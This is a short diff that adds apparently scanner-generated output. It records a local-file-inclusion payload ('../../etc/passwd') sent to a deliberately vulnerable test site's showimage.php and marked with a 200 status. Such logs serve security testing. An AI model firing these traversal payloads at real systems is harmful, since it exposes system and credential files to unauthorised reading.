@@ -1,0 +1,3 @@
+URL: http://testphp.vulnweb.com/showimage.php?file=../../etc/passwd
+Payload: Unix LFI Basic
+Status: 200
